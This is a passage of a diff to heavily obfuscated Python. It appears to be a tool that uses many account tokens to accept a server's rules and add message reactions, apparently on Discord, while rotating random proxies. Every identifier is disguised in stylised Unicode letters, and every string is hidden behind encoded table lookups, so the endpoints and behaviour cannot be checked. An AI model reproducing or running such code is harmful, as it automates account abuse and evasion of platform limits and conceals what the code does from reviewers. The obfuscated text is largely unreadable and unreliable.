𝘐𝙈𝗜𝗹𝘐𝘕𝙄𝘔𝘐𝘐𝗠[98]}{𝙡𝘤}{𝘕𝘔𝙈𝘔𝙉𝘭𝘭𝘔𝗠𝙡𝙈𝗠𝙉𝗹𝙄𝗠𝗜𝘐𝙉𝗠𝗜𝗜𝘔𝙄𝗹𝗜𝗡𝘐𝙈𝗜𝗜𝘔[308]}{𝘳}{𝙉𝗠𝗠𝘔𝘕𝘭𝗹𝗠𝘔𝙡𝗠𝙈𝗡𝘭𝗜𝗠𝙄𝙄𝙉𝗠𝘐𝗜𝗠𝗜𝗹𝘐𝙉𝙄𝙈𝘐𝘐𝗠[100]}{𝘯𝙣}{𝗴}{𝙉𝗠𝘔𝙈𝙉𝘭𝘭𝙈𝘔𝘭𝗠𝗠𝙉𝘭𝗜𝙈𝘐𝗜𝙉𝙈𝘐𝙄𝗠𝘐𝘭𝗜𝗡𝙄𝗠𝘐𝙄𝘔[256]}")
+        𝘱𝗿𝙞𝘯𝘁(f"{𝙧}{𝙄𝗡𝙄𝘕𝘭𝘭𝘐𝘔𝘐𝙄𝗹𝙈𝘭𝗹𝗜𝙡𝗹𝘕𝗡𝗜𝘭𝗹𝙈𝙉𝘭𝗡𝙡𝗠𝗜𝙈𝙄𝙈[91]}{𝘥𝙖𝘵𝙚𝘵𝙞𝘮𝘦.datetime.now().strftime(f'{𝗴}{𝙄𝙉𝘐𝗡𝗹𝘭𝘐𝙈𝘐𝗜𝘭𝗠𝙡𝘭𝙄𝘭𝘭𝙉𝗡𝙄𝘭𝗹𝙈𝙉𝘭𝗡𝘭𝘔𝙄𝗠𝙄𝗠[92]}{𝙧}')}{𝘐𝙉𝗜𝘕𝗹𝘭𝗜𝘔𝙄𝙄𝘭𝘔𝙡𝘭𝘐𝘭𝙡𝗡𝗡𝘐𝘭𝙡𝘔𝙉𝘭𝘕𝗹𝙈𝗜𝙈𝙄𝗠[93]}{𝘳}{𝘐𝗡𝗜𝘕𝗹𝙡𝗜𝘔𝘐𝘐𝗹𝘔𝙡𝘭𝗜𝘭𝙡𝙉𝘕𝗜𝗹𝙡𝗠𝗡𝘭𝗡𝗹𝙈𝗜𝙈𝗜𝗠[91]}{𝘭𝗰}{𝘐𝗡𝗜𝘕𝙡𝙡𝘐𝗠𝗜𝙄𝘭𝗠𝘭𝘭𝗜𝙡𝘭𝘕𝙉𝘐𝙡𝗹𝙈𝘕𝘭𝗡𝘭𝗠𝗜𝘔𝘐𝗠[301]}{𝗿}{𝘐𝙉𝙄𝘕𝗹𝘭𝘐𝗠𝙄𝘐𝘭𝗠𝙡𝗹𝙄𝗹𝗹𝗡𝘕𝙄𝙡𝙡𝗠𝗡𝘭𝘕𝘭𝗠𝘐𝗠𝘐𝗠[93]}{𝙣𝙣}{𝙜}{𝗜𝗡𝙄𝙉𝘭𝗹𝙄𝘔𝘐𝗜𝘭𝙈𝗹𝗹𝘐𝘭𝘭𝘕𝙉𝙄𝙡𝙡𝗠𝙉𝘭𝘕𝗹𝗠𝙄𝙈𝘐𝗠[249]}")
     else:
-        𝗽𝘳𝘪𝙣𝘁(f"{𝗿}{𝗡𝗠𝘔𝗠𝙉𝙡𝘭𝙈𝙈𝙡𝗠𝘔𝘕𝗹𝙄𝗠𝘐𝘐𝘕𝙈𝙄𝙄𝘔𝗜𝙡𝙄𝙉𝙄𝗠𝗜𝘐𝙈[98]}{𝙙𝘢𝙩𝗲𝘵𝗶𝘮𝗲.datetime.now().strftime(f'{𝘨}{𝘕𝘔𝗠𝙈𝘕𝗹𝙡𝘔𝗠𝗹𝙈𝗠𝘕𝘭𝙄𝘔𝗜𝘐𝗡𝗠𝘐𝘐𝙈𝗜𝗹𝗜𝘕𝙄𝗠𝘐𝙄𝗠[99]}{𝙧}')}{𝗡𝘔𝘔𝘔𝗡𝘭𝘭𝗠𝘔𝘭𝙈𝙈𝘕𝗹𝘐𝘔𝘐𝗜𝙉𝙈𝘐𝘐𝘔𝘐𝘭𝗜𝗡𝙄𝙈𝘐𝘐𝙈[100]}{𝗿}{𝘕𝘔𝙈𝗠𝙉𝘭𝙡𝘔𝘔𝘭𝗠𝘔𝗡𝗹𝘐𝘔𝘐𝗜𝗡𝗠𝘐𝙄𝘔𝘐𝘭𝗜𝙉𝙄𝙈𝗜𝙄𝘔[98]}{𝗯}{𝙉𝘔𝙈𝘔𝙉𝘭𝗹𝗠𝙈𝙡𝗠𝙈𝗡𝗹𝙄𝗠𝗜𝘐𝙉𝙈𝘐𝗜𝙈𝘐𝗹𝙄𝘕𝙄𝘔𝙄𝘐𝘔[276]}{𝗿}{𝙉𝗠𝗠𝗠𝙉𝘭𝙡𝗠𝗠𝘭𝘔𝗠𝙉𝗹𝘐𝙈𝘐𝘐𝘕𝗠𝗜𝘐𝙈𝘐𝗹𝗜𝘕𝘐𝘔𝘐𝙄𝗠[100]}{𝙣𝙣}{𝙜}{𝗡𝘔𝘔𝘔𝙉𝗹𝙡𝙈𝗠𝗹𝗠𝙈𝗡𝗹𝗜𝙈𝘐𝗜𝗡𝗠𝗜𝙄𝗠𝘐𝘭𝙄𝗡𝘐𝗠𝙄𝗜𝙈[277]}{𝙧𝗿.text}")
+        𝙥𝘳𝗶𝗻𝘁(f"{𝙧}{𝘐𝗡𝘐𝙉𝗹𝗹𝘐𝗠𝘐𝗜𝙡𝗠𝙡𝘭𝙄𝘭𝙡𝘕𝗡𝗜𝙡𝙡𝘔𝘕𝗹𝙉𝙡𝗠𝗜𝗠𝘐𝗠[91]}{𝙙𝙖𝙩𝙚𝘁𝗶𝗺𝗲.datetime.now().strftime(f'{𝘨}{𝘐𝙉𝙄𝗡𝘭𝗹𝘐𝙈𝙄𝗜𝘭𝙈𝘭𝙡𝗜𝘭𝙡𝙉𝘕𝘐𝗹𝘭𝘔𝘕𝙡𝘕𝙡𝗠𝙄𝙈𝗜𝙈[92]}{𝗿}')}{𝙄𝙉𝘐𝗡𝙡𝙡𝗜𝙈𝙄𝗜𝙡𝙈𝗹𝙡𝘐𝗹𝙡𝗡𝙉𝙄𝗹𝙡𝘔𝗡𝘭𝗡𝗹𝙈𝘐𝙈𝘐𝘔[93]}{𝘳}{𝙄𝘕𝗜𝙉𝙡𝙡𝘐𝙈𝗜𝘐𝙡𝗠𝙡𝗹𝙄𝘭𝙡𝗡𝘕𝙄𝘭𝗹𝗠𝗡𝘭𝙉𝗹𝙈𝗜𝘔𝗜𝘔[91]}{𝘣}{𝗜𝙉𝙄𝗡𝘭𝘭𝙄𝘔𝘐𝗜𝗹𝙈𝘭𝗹𝘐𝙡𝙡𝘕𝙉𝘐𝙡𝙡𝘔𝘕𝘭𝙉𝙡𝙈𝗜𝙈𝗜𝘔[269]}{𝙧}{𝗜𝗡𝘐𝙉𝙡𝘭𝘐𝗠𝘐𝗜𝙡𝘔𝙡𝘭𝙄𝙡𝙡𝗡𝙉𝗜𝙡𝗹𝘔𝘕𝗹𝗡𝙡𝙈𝙄𝗠𝘐𝙈[93]}{𝙣𝗻}{𝙜}{𝘐𝘕𝘐𝘕𝗹𝘭𝗜𝙈𝘐𝙄𝙡𝘔𝘭𝘭𝘐𝗹𝙡𝗡𝘕𝙄𝗹𝗹𝙈𝘕𝗹𝗡𝙡𝙈𝗜𝗠𝘐𝘔[270]}{𝘳𝗿.text}")
 
 def accept_ruless(token, guild):
-    𝙙𝗻 = 𝙩𝙤𝘬𝗲𝙣.split(𝙉𝙈𝙈𝙈𝘕𝘭𝙡𝘔𝘔𝗹𝘔𝘔𝗡𝗹𝗜𝗠𝙄𝗜𝘕𝘔𝘐𝙄𝘔𝙄𝗹𝘐𝙉𝙄𝘔𝙄𝙄𝘔[254])
-    𝘯𝗻 = 𝗱𝙣[0]
-    𝘩𝗲𝙖𝙙𝙚𝙧𝘴 = 𝗛𝗲𝙖𝗱𝘦𝙧𝘀(𝘵𝘰𝙠𝙚𝘯)
+    𝘥𝙣 = 𝘁𝘰𝗸𝙚𝘯.split(𝙄𝗡𝗜𝙉𝙡𝘭𝙄𝘔𝗜𝙄𝘭𝙈𝘭𝙡𝗜𝙡𝙡𝘕𝙉𝗜𝙡𝘭𝗠𝘕𝗹𝙉𝗹𝗠𝗜𝗠𝘐𝙈[247])
+    𝗻𝙣 = 𝘥𝘯[0]
+    𝙝𝘦𝙖𝘥𝘦𝙧𝘴 = 𝘏𝙚𝗮𝘥𝘦𝘳𝘴(𝙩𝘰𝗸𝗲𝘯)
     try:
-        if 𝗽𝗿𝙤𝙭𝙮:
-            𝘯𝙞𝙜 = 𝙧𝘦𝘲𝘶𝘦𝘀𝘵𝘴.get(f'{𝗡𝘔𝙈𝗠𝗡𝘭𝗹𝙈𝘔𝙡𝘔𝙈𝙉𝗹𝘐𝙈𝘐𝙄𝗡𝙈𝙄𝗜𝗠𝘐𝘭𝘐𝗡𝗜𝗠𝙄𝘐𝗠[159]}{𝘨𝘶𝗶𝙡𝗱}{𝙉𝙈𝙈𝘔𝘕𝙡𝘭𝗠𝗠𝘭𝙈𝗠𝙉𝗹𝘐𝗠𝘐𝙄𝘕𝙈𝗜𝗜𝘔𝗜𝙡𝗜𝙉𝙄𝗠𝙄𝘐𝙈[319]}', headers=𝙝𝗲𝗮𝙙𝘦𝗿𝘀, proxy={𝘕𝗠𝘔𝗠𝘕𝘭𝘭𝙈𝘔𝗹𝗠𝙈𝘕𝗹𝗜𝗠𝘐𝘐𝙉𝙈𝗜𝗜𝘔𝘐𝙡𝗜𝙉𝘐𝗠𝙄𝘐𝙈[251]: 𝘕𝙈𝗠𝗠𝙉𝙡𝘭𝙈𝘔𝗹𝙈𝙈𝗡𝙡𝘐𝘔𝗜𝙄𝗡𝗠𝘐𝗜𝙈𝘐𝗹𝗜𝙉𝗜𝗠𝗜𝗜𝙈[253] + 𝙧𝙖𝘯𝘥𝙤𝗺.choice(𝗽𝗿𝗼𝘅𝘪𝗲𝘀), 𝘕𝗠𝗠𝗠𝘕𝘭𝘭𝘔𝘔𝘭𝗠𝙈𝗡𝙡𝘐𝘔𝗜𝙄𝘕𝘔𝗜𝘐𝘔𝗜𝘭𝘐𝙉𝙄𝙈𝘐𝘐𝙈[252]: 𝙉𝗠𝗠𝗠𝘕𝗹𝗹𝘔𝗠𝘭𝙈𝗠𝘕𝗹𝙄𝘔𝘐𝙄𝗡𝘔𝙄𝗜𝙈𝗜𝗹𝙄𝘕𝙄𝙈𝘐𝙄𝘔[253] + 𝘳𝗮𝗻𝘥𝙤𝗺.choice(𝗽𝗿𝘰𝙭𝗶𝘦𝙨)}).json()
+        if 𝘱𝙧𝘰𝘅𝙮:
+            𝗻𝘪𝙜 = 𝗿𝗲𝘲𝘂𝗲𝙨𝙩𝙨.get(f'{𝘐𝙉𝙄𝗡𝘭𝙡𝘐𝗠𝘐𝘐𝗹𝗠𝙡𝙡𝘐𝙡𝙡𝘕𝙉𝙄𝗹𝘭𝙈𝗡𝙡𝗡𝘭𝘔𝗜𝘔𝙄𝘔[152]}{𝘨𝘂𝘪𝗹𝘥}{𝘐𝘕𝘐𝗡𝘭𝗹𝙄𝗠𝗜𝙄𝘭𝙈𝙡𝙡𝘐𝙡𝘭𝙉𝗡𝘐𝗹𝘭𝘔𝘕𝙡𝘕𝘭𝘔𝙄𝘔𝘐𝘔[312]}', headers=𝗵𝘦𝙖𝙙𝙚𝗿𝙨, proxy={𝙄𝙉𝙄𝙉𝘭𝗹𝙄𝘔𝘐𝘐𝘭𝘔𝗹𝗹𝙄𝗹𝘭𝘕𝗡𝙄𝙡𝙡𝗠𝗡𝙡𝙉𝗹𝗠𝘐𝙈𝗜𝙈[244]: 𝙄𝙉𝗜𝗡𝗹𝘭𝗜𝘔𝘐𝙄𝘭𝙈𝗹𝙡𝗜𝙡𝙡𝙉𝗡𝘐𝘭𝗹𝘔𝗡𝗹𝙉𝙡𝗠𝗜𝘔𝙄𝘔[246] + 𝗿𝗮𝘯𝙙𝘰𝗺.choice(𝗽𝙧𝙤𝘅𝗶𝙚𝘴), 𝗜𝙉𝗜𝗡𝘭𝙡𝗜𝙈𝗜𝙄𝗹𝘔𝙡𝙡𝙄𝘭𝙡𝗡𝗡𝘐𝘭𝘭𝗠𝘕𝗹𝙉𝙡𝗠𝘐𝙈𝘐𝗠[245]: 𝘐𝗡𝙄𝙉𝗹𝗹𝘐𝗠𝘐𝙄𝘭𝘔𝗹𝗹𝘐𝗹𝙡𝙉𝗡𝘐𝘭𝗹𝗠𝙉𝙡𝗡𝗹𝙈𝙄𝙈𝗜𝘔[246] + 𝗿𝗮𝙣𝙙𝗼𝘮.choice(𝙥𝙧𝗼𝘅𝗶𝗲𝘀)}).json()
         else:
-            𝗻𝘪𝗴 = 𝗿𝙚𝘲𝘶𝗲𝘀𝘵𝙨.get(f'{𝘕𝘔𝘔𝘔𝙉𝘭𝙡𝙈𝙈𝗹𝘔𝙈𝗡𝗹𝘐𝘔𝙄𝗜𝘕𝘔𝘐𝘐𝗠𝙄𝙡𝙄𝙉𝘐𝗠𝘐𝙄𝘔[159]}{𝙜𝘂𝗶𝗹𝙙}{𝗡𝗠𝗠𝗠𝘕𝘭𝘭𝗠𝙈𝗹𝙈𝗠𝗡𝙡𝗜𝘔𝘐𝘐𝙉𝘔𝗜𝘐𝗠𝙄𝙡𝗜𝗡𝙄𝘔𝘐𝘐𝗠[319]}', headers=𝗵𝗲𝘢𝙙𝙚𝘳𝘴).json()
-        if 𝙥𝙧𝗼𝘅𝙮:
-            𝗿𝗿 = 𝘳𝗲𝗾𝙪𝗲𝙨𝙩𝘀.put(f'{𝙉𝗠𝙈𝗠𝘕𝗹𝙡𝙈𝘔𝘭𝗠𝗠𝙉𝗹𝙄𝗠𝘐𝙄𝗡𝘔𝙄𝙄𝗠𝙄𝗹𝗜𝗡𝙄𝘔𝘐𝗜𝘔[159]}{𝗴𝙪𝗶𝘭𝘥}{𝗡𝗠𝗠𝙈𝗡𝗹𝙡𝗠𝙈𝘭𝘔𝗠𝗡𝘭𝘐𝗠𝙄𝙄𝙉𝙈𝗜𝘐𝙈𝙄𝗹𝘐𝘕𝗜𝘔𝙄𝙄𝗠[320]}', headers=𝗵𝙚𝙖𝗱𝗲𝙧𝘀, json=𝘯𝘪𝘨, proxy={𝘕𝗠𝙈𝘔𝗡𝙡𝙡𝙈𝘔𝙡𝘔𝘔𝙉𝘭𝙄𝗠𝘐𝗜𝘕𝗠𝙄𝘐𝘔𝘐𝘭𝘐𝗡𝙄𝘔𝘐𝙄𝗠[251]: 𝘕𝗠𝗠𝗠𝙉𝙡𝙡𝗠𝘔𝗹𝗠𝘔𝘕𝙡𝘐𝙈𝗜𝘐𝘕𝙈𝗜𝗜𝘔𝘐𝘭𝙄𝘕𝗜𝙈𝘐𝘐𝗠[253] + 𝙧𝙖𝙣𝘥𝘰𝙢.choice(𝙥𝘳𝙤𝘹𝘪𝗲𝘴), 𝘕𝗠𝘔𝙈𝙉𝗹𝗹𝗠𝗠𝘭𝙈𝘔𝗡𝙡𝘐𝘔𝗜𝙄𝙉𝗠𝘐𝘐𝗠𝘐𝘭𝗜𝙉𝗜𝗠𝗜𝗜𝙈[252]: 𝙉𝙈𝗠𝗠𝗡𝙡𝗹𝘔𝙈𝗹𝗠𝗠𝙉𝗹𝘐𝙈𝘐𝗜𝘕𝘔𝙄𝗜𝙈𝙄𝗹𝙄𝘕𝙄𝗠𝗜𝗜𝘔[253] + 𝙧𝗮𝘯𝙙𝘰𝗺.choice(𝘱𝙧𝙤𝙭𝙞𝗲𝘀)})
+            𝗻𝙞𝘨 = 𝘳𝘦𝗾𝘂𝙚𝘴𝘁𝙨.get(f'{𝗜𝗡𝘐𝗡𝘭𝙡𝗜𝗠𝘐𝘐𝙡𝙈𝘭𝙡𝘐𝙡𝘭𝘕𝘕𝗜𝘭𝗹𝘔𝘕𝙡𝙉𝘭𝗠𝗜𝗠𝗜𝗠[152]}{𝘨𝙪𝘪𝘭𝙙}{𝙄𝗡𝗜𝗡𝗹𝗹𝙄𝙈𝘐𝗜𝗹𝘔𝗹𝘭𝘐𝙡𝘭𝗡𝙉𝗜𝘭𝘭𝙈𝗡𝘭𝙉𝘭𝗠𝙄𝘔𝙄𝗠[312]}', headers=𝘩𝗲𝘢𝘥𝙚𝙧𝘀).json()
+        if 𝗽𝘳𝘰𝘹𝘺:
+            𝗿𝗿 = 𝘳𝘦𝗾𝙪𝗲𝙨𝘵𝘀.put(f'{𝗜𝘕𝙄𝙉𝗹𝙡𝘐𝘔𝗜𝘐𝙡𝗠𝗹𝗹𝙄𝘭𝘭𝙉𝘕𝗜𝙡𝘭𝘔𝗡𝙡𝙉𝘭𝗠𝘐𝗠𝘐𝘔[152]}{𝙜𝘶𝙞𝘭𝘥}{𝗜𝘕𝗜𝘕𝙡𝙡𝗜𝙈𝙄𝙄𝙡𝙈𝘭𝙡𝘐𝙡𝘭𝗡𝗡𝙄𝘭𝗹𝗠𝗡𝗹𝗡𝙡𝘔𝙄𝙈𝗜𝗠[313]}', headers=𝘩𝘦𝙖𝙙𝗲𝙧𝘀, json=𝘯𝗶𝗴, proxy={𝘐𝗡𝙄𝙉𝗹𝙡𝗜𝙈𝗜𝘐𝗹𝘔𝘭𝗹𝘐𝙡𝙡𝗡𝙉𝗜𝘭𝘭𝘔𝗡𝙡𝙉𝗹𝗠𝘐𝙈𝙄𝗠[244]: 𝙄𝙉𝘐𝙉𝙡𝗹𝘐𝘔𝘐𝘐𝗹𝙈𝙡𝙡𝗜𝘭𝗹𝘕𝘕𝗜𝘭𝙡𝗠𝘕𝙡𝙉𝘭𝘔𝘐𝘔𝙄𝗠[246] + 𝙧𝘢𝗻𝙙𝘰𝗺.choice(𝘱𝘳𝗼𝘅𝙞𝗲𝘀), 𝙄𝙉𝘐𝗡𝙡𝙡𝘐𝙈𝙄𝗜𝗹𝗠𝘭𝗹𝘐𝗹𝗹𝗡𝙉𝗜𝗹𝘭𝙈𝗡𝘭𝘕𝙡𝘔𝙄𝗠𝗜𝙈[245]: 𝘐𝙉𝗜𝙉𝗹𝙡𝗜𝙈𝗜𝗜𝗹𝙈𝙡𝙡𝙄𝗹𝘭𝙉𝗡𝗜𝘭𝗹𝗠𝘕𝗹𝗡𝙡𝗠𝗜𝘔𝙄𝗠[246] + 𝘳𝗮𝙣𝗱𝙤𝗺.choice(𝘱𝙧𝙤𝘹𝘪𝙚𝙨)})
         else:
-            𝘳𝙧 = 𝙧𝗲𝗾𝘂𝘦𝘴𝙩𝙨.put(f'{𝗡𝙈𝙈𝙈𝙉𝗹𝙡𝗠𝙈𝘭𝘔𝙈𝘕𝘭𝙄𝗠𝙄𝘐𝘕𝘔𝗜𝗜𝘔𝙄𝘭𝘐𝗡𝗜𝙈𝘐𝘐𝗠[159]}{𝘨𝘂𝗶𝘭𝗱}{𝘕𝘔𝘔𝙈𝘕𝗹𝙡𝙈𝘔𝙡𝙈𝙈𝗡𝘭𝙄𝙈𝘐𝘐𝘕𝗠𝗜𝙄𝘔𝘐𝙡𝘐𝗡𝗜𝗠𝗜𝘐𝙈[320]}', headers=𝗵𝗲𝘢𝘥𝙚𝙧𝙨, json=𝗻𝘪𝘨)
+            𝘳𝗿 = 𝙧𝘦𝙦𝘶𝙚𝘴𝘁𝘴.put(f'{𝘐𝗡𝗜𝙉𝙡𝗹𝘐𝙈𝗜𝘐𝙡𝗠𝙡𝘭𝙄𝘭𝙡𝘕𝙉𝙄𝗹𝙡𝗠𝙉𝙡𝘕𝗹𝗠𝘐𝙈𝗜𝘔[152]}{𝘨𝙪𝘪𝘭𝙙}{𝗜𝗡𝗜𝙉𝗹𝙡𝙄𝘔𝙄𝙄𝙡𝘔𝘭𝗹𝗜𝙡𝗹𝙉𝘕𝗜𝗹𝙡𝙈𝗡𝙡𝘕𝗹𝘔𝙄𝗠𝙄𝙈[313]}', headers=𝙝𝙚𝙖𝙙𝙚𝙧𝙨, json=𝘯𝙞𝗴)
     except:
         pass
-    if 𝙧𝗿.status_code == 201:
-        𝙥𝗿𝙞𝗻𝘁(f"{𝙧}{𝙉𝗠𝘔𝘔𝗡𝘭𝗹𝙈𝗠𝙡𝗠𝙈𝙉𝙡𝘐𝙈𝗜𝗜𝘕𝗠𝘐𝗜𝗠𝘐𝗹𝘐𝗡𝙄𝗠𝗜𝗜𝘔[98]}{𝗱𝙖𝙩𝘦𝙩𝗶𝗺𝘦.datetime.now().strftime(f'{𝗴}{𝙉𝙈𝘔𝙈𝘕𝘭𝙡𝗠𝙈𝙡𝗠𝙈𝘕𝙡𝘐𝙈𝗜𝗜𝙉𝗠𝙄𝙄𝙈𝙄𝙡𝘐𝘕𝗜𝙈𝘐𝗜𝘔[99]}{𝘳}')}{𝘕𝗠𝗠𝙈𝙉𝗹𝙡𝘔𝘔𝘭𝗠𝙈𝙉𝗹𝗜𝘔𝗜𝘐𝘕𝗠𝙄𝗜𝗠𝗜𝗹𝘐𝗡𝘐𝘔𝘐𝘐𝘔[100]}{𝗿}{𝙉𝘔𝙈𝘔𝘕𝗹𝗹𝙈𝗠𝙡𝙈𝘔𝗡𝘭𝗜𝘔𝗜𝗜𝘕𝙈𝗜𝗜𝗠𝘐𝙡𝘐𝗡𝙄𝗠𝗜𝘐𝙈[98]}{𝘭𝗰}{𝘕𝗠𝘔𝗠𝘕𝙡𝗹𝗠𝘔𝘭𝘔𝘔𝗡𝗹𝘐𝘔𝘐𝘐𝘕𝗠𝙄𝙄𝗠𝙄𝙡𝙄𝘕𝘐𝘔𝘐𝘐𝘔[308]}{𝗿}{𝘕𝘔𝘔𝗠𝘕𝙡𝗹𝘔𝙈𝙡𝙈𝘔𝙉𝘭𝘐𝘔𝗜𝘐𝘕𝗠𝘐𝗜𝗠𝗜𝙡𝙄𝗡𝘐𝙈𝙄𝘐𝘔[100]}{𝗻𝘯}{𝗡𝗠𝗠𝘔𝙉𝙡𝗹𝘔𝘔𝙡𝙈𝗠𝙉𝗹𝘐𝘔𝗜𝘐𝙉𝗠𝘐𝘐𝘔𝘐𝗹𝗜𝗡𝙄𝗠𝗜𝗜𝙈[256]}{𝙜}")
+    if 𝘳𝗿.status_code == 201:
+        𝗽𝗿𝙞𝗻𝘵(f"{𝙧}{𝙄𝙉𝙄𝘕𝗹𝗹𝘐𝗠𝗜𝙄𝗹𝗠𝗹𝘭𝘐𝙡𝙡𝘕𝘕𝙄𝘭𝘭𝙈𝘕𝗹𝗡𝗹𝗠𝘐𝙈𝘐𝙈[91]}{𝘥𝙖𝘵𝘦𝙩𝘪𝘮𝗲.datetime.now().strftime(f'{𝘨}{𝘐𝘕𝗜𝘕𝘭𝗹𝙄𝗠𝗜𝙄𝘭𝗠𝘭𝗹𝗜𝘭𝘭𝗡𝙉𝙄𝘭𝗹𝙈𝗡𝘭𝙉𝙡𝘔𝘐𝗠𝗜𝙈[92]}{𝘳}')}{𝗜𝗡𝗜𝗡𝗹𝙡𝗜𝗠𝙄𝘐𝙡𝘔𝗹𝘭𝙄𝘭𝙡𝙉𝘕𝗜𝙡𝗹𝙈𝙉𝙡𝘕𝘭𝘔𝘐𝘔𝙄𝗠[93]}{𝙧}{𝗜𝗡𝗜𝘕𝘭𝙡𝙄𝘔𝗜𝘐𝗹𝙈𝙡𝗹𝘐𝘭𝗹𝙉𝘕𝙄𝗹𝘭𝗠𝙉𝗹𝙉𝙡𝙈𝙄𝘔𝙄𝘔[91]}{𝙡𝘤}{𝘐𝗡𝘐𝗡𝗹𝗹𝙄𝙈𝙄𝘐𝙡𝙈𝘭𝘭𝘐𝙡𝗹𝙉𝙉𝘐𝘭𝗹𝙈𝙉𝗹𝗡𝗹𝙈𝙄𝘔𝘐𝙈[301]}{𝘳}{𝙄𝙉𝘐𝗡𝘭𝗹𝘐𝘔𝘐𝗜𝘭𝙈𝗹𝙡𝘐𝘭𝗹𝙉𝗡𝙄𝗹𝙡𝗠𝘕𝙡𝙉𝘭𝗠𝙄𝙈𝘐𝗠[93]}{𝘯𝘯}{𝗜𝙉𝘐𝗡𝙡𝙡𝘐𝘔𝗜𝘐𝗹𝘔𝘭𝗹𝘐𝙡𝙡𝙉𝙉𝘐𝘭𝗹𝘔𝗡𝗹𝙉𝗹𝙈𝗜𝗠𝗜𝗠[249]}{𝙜}")
     else:
-        𝙥𝘳𝘪𝙣𝙩(f"{𝘳}{𝘕𝙈𝗠𝗠𝙉𝙡𝙡𝗠𝗠𝗹𝙈𝗠𝘕𝙡𝗜𝘔𝙄𝙄𝙉𝘔𝙄𝙄𝘔𝘐𝘭𝗜𝘕𝗜𝘔𝘐𝙄𝗠[98]}{𝘥𝙖𝘁𝙚𝘁𝙞𝘮𝗲.datetime.now().strftime(f'{𝗴}{𝙉𝙈𝘔𝘔𝙉𝗹𝗹𝙈𝘔𝙡𝙈𝘔𝘕𝘭𝗜𝘔𝙄𝗜𝘕𝘔𝙄𝘐𝘔𝙄𝙡𝗜𝗡𝗜𝙈𝗜𝗜𝙈[99]}{𝗿}')}{𝗡𝗠𝙈𝗠𝙉𝙡𝗹𝗠𝗠𝘭𝘔𝗠𝙉𝗹𝙄𝙈𝗜𝘐𝙉𝘔𝗜𝙄𝗠𝗜𝘭𝗜𝗡𝘐𝘔𝗜𝙄𝘔[100]}{𝙧}{𝘕𝘔𝙈𝙈𝘕𝘭𝙡𝙈𝘔𝘭𝘔𝘔𝘕𝙡𝗜𝗠𝗜𝘐𝘕𝗠𝗜𝙄𝘔𝗜𝗹𝘐𝗡𝘐𝙈𝘐𝗜𝘔[98]}{𝙡𝗰}{𝘕𝙈𝗠𝙈𝗡𝘭𝗹𝘔𝙈𝘭𝙈𝙈𝘕𝘭𝗜𝘔𝗜𝙄𝘕𝗠𝙄𝘐𝙈𝙄𝗹𝘐𝙉𝘐𝗠𝗜𝗜𝗠[321]}{𝙧}{𝗡𝙈𝗠𝙈𝗡𝘭𝗹𝘔𝙈𝘭𝗠𝘔𝙉𝗹𝗜𝗠𝘐𝘐𝙉𝙈𝘐𝙄𝘔𝘐𝙡𝙄𝙉𝘐𝙈𝙄𝗜𝗠[100]}{𝗻𝘯}{𝗡𝘔𝗠𝘔𝗡𝘭𝙡𝗠𝗠𝘭𝙈𝘔𝙉𝘭𝙄𝘔𝗜𝙄𝙉𝙈𝘐𝙄𝘔𝙄𝙡𝗜𝘕𝙄𝘔𝘐𝗜𝙈[256]}{𝗴}{𝙧𝗿.text}")
+        𝗽𝗿𝙞𝘯𝘵(f"{𝗿}{𝘐𝘕𝙄𝘕𝗹𝙡𝙄𝘔𝘐𝙄𝘭𝘔𝗹𝙡𝘐𝘭𝗹𝘕𝙉𝘐𝙡𝗹𝘔𝙉𝗹𝘕𝘭𝗠𝙄𝘔𝘐𝙈[91]}{𝘥𝗮𝘁𝗲𝘁𝘪𝙢𝙚.datetime.now().strftime(f'{𝘨}{𝗜𝗡𝘐𝗡𝙡𝘭𝙄𝗠𝙄𝘐𝗹𝙈𝘭𝘭𝗜𝙡𝙡𝘕𝘕𝙄𝙡𝙡𝗠𝗡𝙡𝘕𝘭𝗠𝘐𝘔𝗜𝗠[92]}{𝗿}')}{𝘐𝗡𝙄𝗡𝘭𝘭𝙄𝙈𝙄𝙄𝗹𝗠𝘭𝘭𝗜𝗹𝗹𝗡𝙉𝙄𝗹𝘭𝘔𝙉𝗹𝘕𝙡𝘔𝘐𝙈𝘐𝗠[93]}{𝗿}{𝗜𝙉𝘐𝙉𝙡𝘭𝘐𝙈𝗜𝗜𝘭𝗠𝙡𝘭𝙄𝘭𝘭𝗡𝗡𝘐𝘭𝘭𝗠𝘕𝘭𝙉𝗹𝘔𝘐𝘔𝘐𝙈[91]}{𝙡𝗰}{𝗜𝘕𝗜𝙉𝘭𝙡𝘐𝗠𝙄𝙄𝗹𝗠𝘭𝘭𝗜𝗹𝘭𝘕𝘕𝗜𝘭𝘭𝘔𝗡𝗹𝗡𝙡𝗠𝗜𝗠𝗜𝘔[314]}{𝗿}{𝗜𝗡𝙄𝙉𝙡𝙡𝗜𝙈𝗜𝙄𝘭𝗠𝗹𝘭𝘐𝗹𝙡𝗡𝘕𝙄𝙡𝘭𝘔𝘕𝗹𝙉𝗹𝙈𝘐𝗠𝗜𝙈[93]}{𝗻𝗻}{𝙄𝙉𝙄𝘕𝙡𝗹𝗜𝙈𝙄𝙄𝗹𝙈𝗹𝘭𝘐𝘭𝘭𝙉𝗡𝙄𝗹𝗹𝗠𝘕𝙡𝗡𝘭𝙈𝘐𝗠𝗜𝘔[249]}{𝘨}{𝗿𝙧.text}")
 
 def reactor(token, emoji, message_link):
-    𝙝𝙚𝙖𝘥𝗲𝗿𝘀 = 𝗛𝙚𝙖𝘥𝙚𝗿𝙨(𝘁𝙤𝙠𝗲𝙣)
-    𝙘𝘩𝙖𝙣𝙣𝙚𝘭_𝗶𝘥 = 𝙢𝘦𝘴𝙨𝗮𝗴𝗲_𝙡𝗶𝘯𝙠.split(𝗡𝙈𝙈𝗠𝘕𝗹𝗹𝗠𝘔𝙡𝗠𝘔𝘕𝘭𝙄𝙈𝗜𝙄𝘕𝙈𝙄𝘐𝗠𝗜𝘭𝗜𝗡𝙄𝘔𝗜𝘐𝙈[322])[5]
-    𝗺𝙚𝘴𝙨𝘢𝙜𝗲_𝗶𝙙 = 𝙢𝙚𝘴𝙨𝗮𝙜𝙚_𝗹𝘪𝗻𝙠.split(𝘕𝙈𝗠𝘔𝙉𝙡𝗹𝘔𝘔𝗹𝘔𝙈𝙉𝙡𝘐𝗠𝘐𝗜𝘕𝗠𝘐𝘐𝗠𝗜𝙡𝘐𝗡𝘐𝙈𝘐𝗜𝗠[322])[6]
-    if 𝗽𝘳𝘰𝙭𝙮:
